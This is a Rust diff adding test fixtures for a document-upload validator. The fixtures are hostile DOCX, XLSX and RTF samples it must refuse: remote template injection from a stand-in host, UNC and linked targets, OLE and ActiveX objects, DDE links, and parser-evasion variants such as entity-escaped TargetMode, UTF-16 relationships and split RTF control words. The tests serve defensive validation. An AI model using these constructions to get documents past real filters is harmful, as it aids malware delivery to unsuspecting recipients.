@@ -23,7 +23,8 @@ pub enum Refusal {
     /// and `.png` belong under Photos.
     Photo,
     /// `DOCUMENT_CONTENT_MISMATCH`: the extension is on the list, the
-    /// content isn't what it says, or holds macros.
+    /// content isn't what it says, or holds macros, embedded objects or links
+    /// to outside content.
     ContentMismatch,
 }
 
@@ -84,6 +85,19 @@ pub fn refused_documents() -> Vec<Hostile> {
         (doc_with_macros_storage(), ContentMismatch),
         (xls_with_vba_project(), ContentMismatch),
         (odt_with_basic(), ContentMismatch),
+        (docx_with_remote_template(), ContentMismatch),
+        (docx_with_linked_image(), ContentMismatch),
+        (docx_with_unc_target(), ContentMismatch),
+        (docx_with_escaped_target_mode(), ContentMismatch),
+        (docx_with_doctype_relationships(), ContentMismatch),
+        (docx_with_utf16_relationships(), ContentMismatch),
+        (docx_with_oddly_named_relationships(), ContentMismatch),
+        (docx_with_ole_object(), ContentMismatch),
+        (docx_with_activex(), ContentMismatch),
+        (xlsx_with_external_link(), ContentMismatch),
+        (rtf_with_object(), ContentMismatch),
+        (rtf_with_template(), ContentMismatch),
+        (rtf_with_split_object(), ContentMismatch),
         (html_named_pdf(), ContentMismatch),
         (zip_named_docx(), ContentMismatch),
         (text_named_tiff(), ContentMismatch),
@@ -317,6 +331,230 @@ pub fn odt_with_basic() -> Generated {
         ("Basic/Standard/Module1.xml", b"<script:module/>"),
     ];
     Generated::new("macros.odt", zip_stored(&entries))
+}
+
+// ------------------------------------------------ objects, outside content
+
+/// The Transitional relationship types' namespace.
+const REL: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
+
+/// A relationship part holding `relationships`, each a whole
+/// `<Relationship …/>`.
+fn rels(relationships: &str) -> String {
+    format!(
+        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
+         <Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+         {relationships}</Relationships>"
+    )
+}
+
+/// A DOCX with `extra` entries, each a part name and its content.
+fn docx(name: &str, extra: &[(&str, &[u8])]) -> Generated {
+    Generated::new(name, word_package(WORD_MAIN, extra))
+}
+
+/// A DOCX whose settings link a macro-enabled template on a web server,
+/// which Word fetches when it opens the file (remote template injection).
+pub fn docx_with_remote_template() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/attachedTemplate\" \
+         Target=\"https://example.invalid/template.dotm\" TargetMode=\"External\"/>"
+    ));
+    docx("letter.docx", &[("word/_rels/settings.xml.rels", rels.as_bytes())])
+}
+
+/// A DOCX whose picture is linked from a file share rather than kept in it.
+pub fn docx_with_linked_image() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/image\" \
+         Target=\"file://example.invalid/share/logo.png\" TargetMode=\"External\"/>"
+    ));
+    docx("linked-image.docx", &[("word/_rels/document.xml.rels", rels.as_bytes())])
+}
+
+/// A DOCX whose picture's target is a UNC path, with no `TargetMode`.
+pub fn docx_with_unc_target() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/image\" \
+         Target=\"\\\\example.invalid\\share\\logo.png\"/>"
+    ));
+    docx("unc-image.docx", &[("word/_rels/document.xml.rels", rels.as_bytes())])
+}
+
+/// A remote template whose `TargetMode` is written with a character
+/// reference, `&#69;xternal`, which an XML reader reads as `External`.
+pub fn docx_with_escaped_target_mode() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/attachedTemplate\" \
+         Target=\"https://example.invalid/template.dotm\" TargetMode=\"&#69;xternal\"/>"
+    ));
+    docx("escaped.docx", &[("word/_rels/settings.xml.rels", rels.as_bytes())])
+}
+
+/// A remote template in a relationship part declaring a DTD, whose entity
+/// spells `External`.
+pub fn docx_with_doctype_relationships() -> Generated {
+    let rels = format!(
+        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
+         <!DOCTYPE Relationships [<!ENTITY mode \"External\">]>\
+         <Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+         <Relationship Id=\"rId1\" Type=\"{REL}/attachedTemplate\" \
+         Target=\"https://example.invalid/template.dotm\" TargetMode=\"&mode;\"/>\
+         </Relationships>"
+    );
+    docx("doctype.docx", &[("word/_rels/settings.xml.rels", rels.as_bytes())])
+}
+
+/// A remote template in a relationship part written in UTF-16, which a
+/// UTF-8 reader would see no elements in.
+pub fn docx_with_utf16_relationships() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/attachedTemplate\" \
+         Target=\"https://example.invalid/template.dotm\" TargetMode=\"External\"/>"
+    ))
+    .replace("UTF-8", "UTF-16");
+    let mut utf16 = vec![0xFF, 0xFE];
+    utf16.extend(rels.encode_utf16().flat_map(u16::to_le_bytes));
+    docx("utf16.docx", &[("word/_rels/settings.xml.rels", &utf16)])
+}
+
+/// A remote template in an entry under `_rels` whose name doesn't end in
+/// `.rels` as written.
+pub fn docx_with_oddly_named_relationships() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/attachedTemplate\" \
+         Target=\"https://example.invalid/template.dotm\" TargetMode=\"External\"/>"
+    ));
+    docx("odd-name.docx", &[("word/_rels/settings.xml.rel%73", rels.as_bytes())])
+}
+
+/// A DOCX with an embedded OLE object (an object packager's `.bin`).
+pub fn docx_with_ole_object() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/oleObject\" Target=\"embeddings/oleObject1.bin\"/>"
+    ));
+    docx(
+        "ole.docx",
+        &[
+            ("word/_rels/document.xml.rels", rels.as_bytes()),
+            ("word/embeddings/oleObject1.bin", &[0xD0, 0xCF, 0x11, 0xE0]),
+        ],
+    )
+}
+
+/// A DOCX with an ActiveX control.
+pub fn docx_with_activex() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/control\" Target=\"activeX/activeX1.xml\"/>"
+    ));
+    docx(
+        "activex.docx",
+        &[
+            ("word/_rels/document.xml.rels", rels.as_bytes()),
+            ("word/activeX/activeX1.xml", b"<ax:ocx/>"),
+        ],
+    )
+}
+
+/// A DOCX with a hyperlink to a web page and a picture kept in the package:
+/// ordinary, and accepted.
+pub fn docx_with_hyperlink() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/hyperlink\" \
+         Target=\"https://example.com/receipt\" TargetMode=\"External\"/>\
+         <Relationship Id=\"rId2\" Type=\"http://purl.oclc.org/ooxml/officeDocument/relationships/hyperlink\" \
+         Target=\"mailto:dealer@example.com\" TargetMode=\"External\"/>\
+         <Relationship Id=\"rId3\" Type=\"{REL}/image\" Target=\"media/image1.png\"/>"
+    ));
+    docx(
+        "hyperlink.docx",
+        &[
+            ("word/_rels/document.xml.rels", rels.as_bytes()),
+            ("word/media/image1.png", &[0x89, b'P', b'N', b'G']),
+        ],
+    )
+}
+
+/// A DOCX with a chart, whose data is an embedded workbook package: ordinary,
+/// and accepted.
+pub fn docx_with_chart_workbook() -> Generated {
+    let rels = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/package\" \
+         Target=\"../embeddings/Microsoft_Excel_Worksheet.xlsx\"/>"
+    ));
+    docx(
+        "chart.docx",
+        &[
+            ("word/charts/_rels/chart1.xml.rels", rels.as_bytes()),
+            ("word/embeddings/Microsoft_Excel_Worksheet.xlsx", b"PK\x03\x04"),
+        ],
+    )
+}
+
+const SHEET_MAIN: &str =
+    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml";
+
+/// An XLSX whose workbook links another workbook (or a DDE server) through
+/// an external link part.
+pub fn xlsx_with_external_link() -> Generated {
+    let types = format!(
+        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
+         <Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\
+         <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\
+         <Default Extension=\"xml\" ContentType=\"application/xml\"/>\
+         <Override PartName=\"/xl/workbook.xml\" ContentType=\"{SHEET_MAIN}\"/></Types>"
+    );
+    let package = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/officeDocument\" Target=\"xl/workbook.xml\"/>"
+    ));
+    let workbook = rels(&format!(
+        "<Relationship Id=\"rId1\" Type=\"{REL}/externalLink\" \
+         Target=\"externalLinks/externalLink1.xml\"/>"
+    ));
+    let entries: Vec<(&str, &[u8])> = vec![
+        ("[Content_Types].xml", types.as_bytes()),
+        ("_rels/.rels", package.as_bytes()),
+        ("xl/workbook.xml", b"<workbook/>"),
+        ("xl/_rels/workbook.xml.rels", workbook.as_bytes()),
+        ("xl/externalLinks/externalLink1.xml", b"<externalLink><ddeLink/></externalLink>"),
+    ];
+    Generated::new("linked.xlsx", zip_stored(&entries))
+}
+
+/// An RTF with an embedded object (an object packager, as in the Equation
+/// Editor exploits).
+pub fn rtf_with_object() -> Generated {
+    Generated::new(
+        "letter.rtf",
+        b"{\\rtf1\\ansi{\\object\\objemb{\\*\\objclass Package}{\\*\\objdata 0105000002000000}}}"
+            .to_vec(),
+    )
+}
+
+/// An RTF that names a template on a web server.
+pub fn rtf_with_template() -> Generated {
+    Generated::new(
+        "template.rtf",
+        b"{\\rtf1\\ansi{\\*\\template https://example.invalid/template.dotm}Hello}".to_vec(),
+    )
+}
+
+/// An RTF whose object word is split by a line break and written in
+/// capitals, which an RTF reader still reads as `\object`.
+pub fn rtf_with_split_object() -> Generated {
+    Generated::new("split.rtf", b"{\\rtf1\\ansi{\\OB\r\nJECT\\objemb}}".to_vec())
+}
+
+/// An RTF with a font table, a hyperlink field and the word "object" in its
+/// text: ordinary, and accepted.
+pub fn plain_rtf() -> Generated {
+    Generated::new(
+        "plain.rtf",
+        b"{\\rtf1\\ansi{\\fonttbl{\\f0 Arial;}}\
+          {\\field{\\*\\fldinst HYPERLINK \"https://example.com\"}{\\fldrslt the dealer}}\\par \
+          The object of this sale is one rifle.\\par}"
+            .to_vec(),
+    )
 }
 
 // -------------------------------------------------------- content mismatch
